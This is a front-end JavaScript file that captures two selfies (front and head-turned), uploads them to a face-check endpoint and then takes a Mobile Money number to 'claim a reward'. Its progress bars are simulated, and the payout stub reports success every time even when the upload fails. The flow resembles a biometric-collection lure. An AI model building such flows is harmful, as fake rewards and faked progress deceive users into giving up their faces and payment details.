const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const startBtn = document.getElementById("startBtn");
const closeBtn = document.getElementById("closeBtn");
const backBtn = document.getElementById("backBtn");
const stepProgress = document.getElementById("stepProgress");
const stepTitle = document.getElementById("stepTitle");
const stepText = document.getElementById("stepText");
const countdownEl = document.getElementById("countdown");
const alignBadge = document.getElementById("alignBadge");
const cameraError = document.getElementById("cameraError");
const startScreen = document.getElementById("startScreen");
const cameraScreen = document.getElementById("cameraScreen");
const rewardScreen = document.getElementById("rewardScreen");
const claimScreen = document.getElementById("claimScreen");
const thankOverlay = document.getElementById("thankOverlay");
const rewardCloseBtn = document.getElementById("rewardCloseBtn");
const nextBtn = document.getElementById("nextBtn");
const retryBtn = document.getElementById("retryBtn");
const thankCard = document.getElementById("thankCard");
const thankCardMsg = document.getElementById("thankCardMsg");

const claimBackBtn = document.getElementById("claimBackBtn");
const claimCloseBtn = document.getElementById("claimCloseBtn");
const claimForm = document.getElementById("claimForm");
const networkSelect = document.getElementById("networkSelect");
const momoNumber = document.getElementById("momoNumber");
const claimBtn = document.getElementById("claimBtn");
const claimError = document.getElementById("claimError");
const claimSuccess = document.getElementById("claimSuccess");
const doneBtn = document.getElementById("doneBtn");

const submissionBar = document.getElementById("submissionBar");
const rewardBar = document.getElementById("rewardBar");
const submissionPercent = document.getElementById("submissionPercent");
const rewardPercent = document.getElementById("rewardPercent");
const submissionLabel = document.getElementById("submissionLabel");
const rewardLabel = document.getElementById("rewardLabel");

const progressFace = document.getElementById("progressFace");
const progressReward = document.getElementById("progressReward");
const progressClaim = document.getElementById("progressClaim");
const progressDone = document.getElementById("progressDone");

const screens = [startScreen, cameraScreen, rewardScreen, claimScreen];
const API_ENDPOINT = "/api/face-check";

let stream = null;
let step = 1;
let countdownTimer = null;
let detectTimer = null;
let isCountingDown = false;
let detector = null;
let fallbackReadyAt = 0;
let progressTimer = null;
let activeScreen = startScreen;

const photos = {
  selfie_front: null,
  selfie_turn: null
};

const steps = [
  {
    title: "Look at the camera",
    text: "Hold still."
  },
  {
    title: "Turn your head slightly",
    text: "Almost done."
  }
];

startBtn.addEventListener("click", async () => {
  const ok = await startCamera();
  if (!ok) return;
  step = 1;
  setStep(step);
  showScreen(cameraScreen);
  setProgress("face");
  startDetectLoop();
});

closeBtn.addEventListener("click", () => closeFlow());
backBtn.addEventListener("click", () => resetFlow());
rewardCloseBtn.addEventListener("click", () => closeFlow());
nextBtn.addEventListener("click", () => goToClaim());
retryBtn.addEventListener("click", () => runProgress());
claimBackBtn.addEventListener("click", () => goToReward());
claimCloseBtn.addEventListener("click", () => closeFlow());
doneBtn.addEventListener("click", () => closeFlow());
claimForm.addEventListener("submit", (e) => submitClaim(e));

async function startCamera() {
  try {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      throw new Error("CameraNotSupported");
    }
    if (!window.isSecureContext) {
      throw new Error("InsecureContext");
    }
    if (stream) return true;
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });
    video.srcObject = stream;
    await video.play();

    if ("FaceDetector" in window) {
      detector = new FaceDetector({ fastMode: true, maxDetectedFaces: 1 });
    }

    return true;
  } catch (err) {
    resetFlow();
    let msg = "We couldn't access your camera. Please allow camera access and try again.";
    if (err?.message === "InsecureContext") {
      msg = "Camera access requires HTTPS. Open this page on https:// or localhost.";
    } else if (err?.message === "CameraNotSupported") {
      msg = "Camera is not available on this device or browser.";
    }
    if (cameraError) {
      cameraError.textContent = msg;
      cameraError.classList.remove("hidden");
    } else {
      alert(msg);
    }
    return false;
  }
}

function stopCamera() {
  if (!stream) return;
  stream.getTracks().forEach((t) => t.stop());
  stream = null;
  detector = null;
  if (video) video.srcObject = null;
}

function cleanupCamera() {
  stopDetectLoop();
  cancelCountdown();
  stopCamera();
}

function showScreen(screen) {
  if (activeScreen === cameraScreen && screen !== cameraScreen) {
    cleanupCamera();
  }
  screens.forEach((s) => {
    if (s === screen) {
      s.classList.remove("hidden");
      requestAnimationFrame(() => s.classList.add("is-active"));
    } else if (!s.classList.contains("hidden")) {
      s.classList.remove("is-active");
      setTimeout(() => s.classList.add("hidden"), 220);
    }
  });
  activeScreen = screen;
}

function setProgress(stage) {
  progressFace.classList.remove("active", "done");
  progressReward.classList.remove("active", "done");
  progressClaim.classList.remove("active", "done");
  progressDone.classList.remove("active", "done");

  if (stage === "face") {
    progressFace.classList.add("active");
  } else if (stage === "reward") {
    progressFace.classList.add("done");
    progressReward.classList.add("active");
  } else if (stage === "claim") {
    progressFace.classList.add("done");
    progressReward.classList.add("done");
    progressClaim.classList.add("active");
  } else if (stage === "done") {
    progressFace.classList.add("done");
    progressReward.classList.add("done");
    progressClaim.classList.add("done");
    progressDone.classList.add("active");
  }
}

function setStep(nextStep) {
  step = nextStep;
  stepProgress.textContent = `${step} of 2`;
  stepTitle.textContent = steps[step - 1].title;
  stepText.textContent = steps[step - 1].text;
}

function startDetectLoop() {
  stopDetectLoop();
  fallbackReadyAt = Date.now() + 700;

  const loop = async () => {
    if (!stream) return;

    const ready = video.readyState >= 2;
    if (!ready) {
      detectTimer = setTimeout(loop, 200);
      return;
    }

    let aligned = false;

    if (detector) {
      try {
        const faces = await detector.detect(video);
        if (faces && faces.length) {
          const { x, y, width, height } = faces[0].boundingBox;
          aligned = isFaceAligned(x, y, width, height, video.videoWidth, video.videoHeight);
        }
      } catch (e) {
        aligned = false;
      }
    } else {
      aligned = Date.now() >= fallbackReadyAt;
    }

    updateAlignment(aligned);
    detectTimer = setTimeout(loop, 300);
  };

  loop();
}

function stopDetectLoop() {
  if (detectTimer) {
    clearTimeout(detectTimer);
    detectTimer = null;
  }
  updateAlignment(false);
}

function isFaceAligned(x, y, width, height, vw, vh) {
  const faceCenterX = x + width / 2;
  const faceCenterY = y + height / 2;

  const dx = Math.abs(faceCenterX - vw / 2) / vw;
  const dy = Math.abs(faceCenterY - vh / 2) / vh;
  const faceSize = height / vh;

  return dx < 0.12 && dy < 0.12 && faceSize > 0.18 && faceSize < 0.75;
}

function updateAlignment(aligned) {
  if (aligned) {
    alignBadge.textContent = "Perfect";
    alignBadge.classList.remove("hidden");
    if (!isCountingDown) startCountdown();
  } else {
    alignBadge.classList.add("hidden");
    cancelCountdown();
  }
}

function startCountdown() {
  if (isCountingDown) return;
  isCountingDown = true;

  let remaining = 2;
  countdownEl.textContent = remaining;
  countdownEl.classList.remove("hidden");

  countdownTimer = setInterval(() => {
    remaining -= 1;
    if (remaining <= 0) {
      clearInterval(countdownTimer);
      countdownTimer = null;
      countdownEl.classList.add("hidden");
      isCountingDown = false;
      capturePhoto();
    } else {
      countdownEl.textContent = remaining;
    }
  }, 1000);
}

function cancelCountdown() {
  if (countdownTimer) {
    clearInterval(countdownTimer);
    countdownTimer = null;
  }
  isCountingDown = false;
  countdownEl.classList.add("hidden");
}

function capturePhoto() {
  if (!stream) return;

  const ctx = canvas.getContext("2d");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  const dataUrl = canvas.toDataURL("image/jpeg", 0.9);

  if (step === 1) {
    stopDetectLoop();
    cancelCountdown();
    photos.selfie_front = dataUrl;
    setStep(2);
    setTimeout(() => startDetectLoop(), 300);
  } else {
    photos.selfie_turn = dataUrl;
    finishCapture();
  }
}

function finishCapture() {
  stopDetectLoop();
  stopCamera();
  showScreen(rewardScreen);
  setProgress("reward");
  runProgress();
}

async function runProgress() {
  resetProgress();
  nextBtn.disabled = true;
  retryBtn.classList.add("hidden");
  thankCard.classList.add("hidden");

  let submission = 0;
  let reward = 0;
  let degraded = false;

  const PROGRESS_DURATION_MS = 2600;
  const startedAt = Date.now();
  const easeOutCubic = (t) => 1 - Math.pow(1 - t, 3);

  const payload = {
    selfie_front: photos.selfie_front,
    selfie_turn: photos.selfie_turn
  };

  const submissionPromise = fetch(API_ENDPOINT, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  }).catch(() => null);

  progressTimer = setInterval(() => {
    const elapsed = Date.now() - startedAt;
    const t = Math.min(1, elapsed / PROGRESS_DURATION_MS);
    const eased = easeOutCubic(t);

    submission = Math.round(eased * 100);
    reward = Math.round(eased * 100);

    if (t >= 1) {
      updateMeter(100, 100, true, degraded);
      return;
    }

    updateMeter(submission, reward, false, degraded);
  }, 80);

  const response = await submissionPromise;
  if (response && response.ok) {
    updateMeter(100, 100, true, false);
    return;
  }

  degraded = true;
  submissionLabel.textContent = "Submission delayed. We'll retry shortly.";
  rewardLabel.textContent = "Reward pending.";
  retryBtn.classList.remove("hidden");
}

function updateMeter(submission, reward, complete = false, degraded = false) {
  submissionBar.style.width = `${submission}%`;
  rewardBar.style.width = `${reward}%`;
  submissionPercent.textContent = `${submission}%`;
  rewardPercent.textContent = `${reward}%`;

  if (!degraded) {
    if (submission >= 100) {
      submissionLabel.textContent = "Submission complete.";
    }
    if (reward >= 100) {
      rewardLabel.textContent = "Reward ready.";
    }
  } else if (complete) {
    submissionLabel.textContent = "Submission queued. You can continue.";
    rewardLabel.textContent = "You can proceed to claim your reward.";
  }

  if (complete) {
    clearInterval(progressTimer);
    progressTimer = null;
    nextBtn.disabled = false;
    showThankCard();
    if (degraded) {
      thankCardMsg.textContent = "Submission queued. Continue to claim your reward.";
      thankCard.classList.remove("hidden");
    }
  }
}

function goToReward() {
  showScreen(rewardScreen);
  setProgress("reward");
}

function goToClaim() {
  if (nextBtn.disabled) return;
  clearClaimError();
  showScreen(claimScreen);
  setProgress("claim");
}

function clearClaimError() {
  claimError.textContent = "";
  claimError.classList.add("hidden");
}

function setClaimBusy(busy) {
  claimBtn.disabled = busy;
  claimBtn.textContent = busy ? "Processing..." : "Claim Reward";
  networkSelect.disabled = busy;
  momoNumber.disabled = busy;
}

async function submitClaim(event) {
  event.preventDefault();
  clearClaimError();

  const network = networkSelect.value;
  const momoRaw = (momoNumber.value || "").trim();
  const momoDigits = momoRaw.replace(/\\D/g, "");

  if (!network) {
    claimError.textContent = "Please select your mobile network.";
    claimError.classList.remove("hidden");
    return;
  }

  if (momoDigits.length < 9) {
    claimError.textContent = "Please enter a valid Mobile Money number.";
    claimError.classList.remove("hidden");
    return;
  }

  setClaimBusy(true);
  try {
    await processRewardClaim({ network, momo: momoDigits });
    claimForm.classList.add("hidden");
    claimSuccess.classList.remove("hidden");
    setProgress("done");
    triggerThankYou();
    if (window.parent && window.parent !== window) {
      window.parent.postMessage({ type: "facecheck:complete" }, "*");
    }
  } catch (e) {
    claimError.textContent = "We couldn't process your reward right now. Please try again.";
    claimError.classList.remove("hidden");
    setClaimBusy(false);
  }
}

function processRewardClaim(payload) {
  // Placeholder: wire to your real payout backend when ready.
  return new Promise((resolve) => {
    window.setTimeout(() => resolve(payload), 1200);
  });
}

function resetProgress() {
  submissionBar.style.width = "0%";
  rewardBar.style.width = "0%";
  submissionPercent.textContent = "0%";
  rewardPercent.textContent = "0%";
  submissionLabel.textContent = "Uploading selfies...";
  rewardLabel.textContent = "Preparing your reward...";
  if (progressTimer) {
    clearInterval(progressTimer);
    progressTimer = null;
  }
}

function triggerThankYou() {
  thankOverlay.classList.remove("hidden");
  setTimeout(() => {
    thankOverlay.classList.add("hidden");
  }, 2000);
}

function showThankCard() {
  const messages = [
    "Your report helps keep the community safe.",
    "Thanks for showing up - you made a difference.",
    "We appreciate your time and care.",
    "Your contribution strengthens our digital safety.",
    "You just helped protect someone else."
  ];
  thankCardMsg.textContent = messages[Math.floor(Math.random() * messages.length)];
  thankCard.classList.remove("hidden");
}

function resetFlow() {
  cleanupCamera();
  if (progressTimer) {
    clearInterval(progressTimer);
    progressTimer = null;
  }
  thankCard.classList.add("hidden");
  retryBtn.classList.add("hidden");
  nextBtn.disabled = true;

  claimForm.classList.remove("hidden");
  claimSuccess.classList.add("hidden");
  networkSelect.value = "";
  momoNumber.value = "";
  setClaimBusy(false);
  clearClaimError();

  photos.selfie_front = null;
  photos.selfie_turn = null;
  step = 1;
  if (cameraError) {
    cameraError.classList.add("hidden");
    cameraError.textContent = "";
  }
  showScreen(startScreen);
  setProgress("face");
}

function closeFlow() {
  resetFlow();
  if (window.parent && window.parent !== window) {
    window.parent.postMessage({ type: "facecheck:close" }, "*");
  }
}

function handleVisibility() {
  if (document.hidden) {
    cleanupCamera();
    if (progressTimer) {
      clearInterval(progressTimer);
      progressTimer = null;
    }
  }
}

window.addEventListener("visibilitychange", handleVisibility);
window.addEventListener("pagehide", () => cleanupCamera());
window.addEventListener("beforeunload", () => cleanupCamera());
window.addEventListener("message", (event) => {
  if (event?.data?.type === "facecheck:shutdown") {
    resetFlow();
  }
});

setProgress("face");
showScreen(startScreen);
